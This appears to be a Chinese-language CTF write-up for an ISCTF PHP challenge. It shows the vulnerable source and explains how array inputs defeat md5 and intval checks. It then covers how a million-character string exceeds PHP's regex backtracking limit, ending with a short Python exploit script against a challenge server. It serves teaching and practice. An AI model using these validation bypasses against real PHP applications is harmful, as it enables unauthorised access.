## 绕进你的心里

***

出题人:fpclose

![image-20240413223539249](C:\Users\26272\AppData\Roaming\Typora\typora-user-images\image-20240413223539249.png)

源码：

```php
 <?php
highlight_file(__FILE__);
error_reporting(0);
require 'flag.php';
$str = (String)$_POST['pan_gu'];
$num = $_GET['zhurong'];
$lida1 = $_GET['hongmeng'];
$lida2 = $_GET['shennong'];
if($lida1 !== $lida2 && md5($lida1) === md5($lida2)){
    echo "md5绕过了!";
    if(preg_match("/[0-9]/", $num)){
        die('你干嘛?哎哟!');
    }
    elseif(intval($num)){
        if(preg_match('/.+?ISCTF/is', $str)){
            die("再想想!");
        }
        if(stripos($str, '2023ISCTF') === false){
            die("就差一点点啦!");
        }
        echo $flag;
    }
}
?> 

```

分析：题目要求我们传入4个参数，满足条件即可获得flag。

源码接入两个get型参数（hongmeng、shennong）分别赋值给 \$lida1 和 \$lida2 。然后使用 if 条件语句进行判断：

### 第一层：

如果 \$lida1 和 \$lida2 的值 **强不等于**并且两者的**md5加密后的值强相等**，则代码继续往下执行，也就是我们传入的参数必须满足以下条件。

这里可以使用**数组**进行绕过。

### 第二层：

在这里，intval() 函数会将 \$num 给转换为数字，但如果字符中没有找到数字，那么就被视为不可转换的字符，即返回 false。

也就是说，我们传入的字符串内必须含有一个数字。

这里同样也可以使用数组绕过，intval() 函数处理非空数组时会返回整数1。

### 第三层：

判断 str 是否包含 ‘2023ISCTF’，如果不包含，则输出相应提示，否则输出 \$flag。但是如果我们的字符换中包含有 2023ISCTF 那么就会与正则函数相冲突。这里使用回溯绕过跳过正则的限制。

exp如下：

```python
//构造exp
import requests
data={"pan[gu":"a"*(1000000)+"2023ISCTF"}
url="http://47.109.106.104:9999/?hongmeng[]=1&shennong[]=2&zhurong[]=1"
res = requests.post(data=data,url=url)
print(res.text)

```

将ip替换即可使用。 运行程序直接获得flag。



